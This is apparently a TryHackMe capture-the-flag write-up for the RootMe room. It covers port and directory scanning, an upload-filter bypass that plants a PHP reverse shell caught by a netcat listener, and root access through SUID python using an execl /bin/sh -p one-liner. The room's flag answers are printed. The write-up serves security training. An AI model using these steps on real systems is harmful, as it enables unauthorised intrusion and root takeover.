# RootMe  ctf room of tryhackme

## Task2 : Reconnaissance

### 1.Scan the machine, how many ports are open : 2
- run nmap and scan the machine
```bash
nmap -sS -sV 10.10.157.26

Starting Nmap 7.60 ( https://nmap.org ) at 2022-09-10 13:16 BST
Nmap scan report for ip-10-10-157-26.eu-west-1.compute.internal (10.10.157.26)
Host is up (0.067s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:DD:4F:EB:17:1F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.49 seconds
```
### 2. What version of Apache is running:2.4.29
- from the nmap scan

### 3. What service is running on port 22: ssh
- from the nmap scan

### 4. What is the hidden directory :/panel/

- run dir scan using gobuster

```bash

gobuster dir -u 10.10.157.26 -w /root/Desktop/Tools/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.157.26
[+] Threads:        10
[+] Wordlist:       /root/Desktop/Tools/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/09/10 13:20:43 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2022/09/10 13:20:53 Finished
===============================================================

```



## Task3 

1. setup a netcat listener on the attacker machine
```
nc -lvnp 1234
```

2. search for a reverseshell exploit in php
[here](https://github.com/pentestmonkey/php-reverse-shell.git)

3. change extention of the file to phtml or php.txt

4. dont forget to change ip and port in the file

5. upload the file and you will receive the shell

```shell

$ find / -name user.txt 2>/dev/null 
/var/www/user.txt
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}

```

## Task4:

### 1. Search for files with SUID permission, which file is weird: /usr/bin/python

- run this command to fine all files with suid bit

```
find / -perm /4000 2>/dev/null
```

### 2. Find a form to escalate your privileges.

- we can use this exploit to get root access check [here](https://gtfobins.github.io/gtfobins/python/)

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### 3. root.txt

```
#find / -name root.txt 2>/dev/null
#/root/root.txt
#cat /root/root.txt
#THM{pr1v1l3g3_3sc4l4t10n}
```


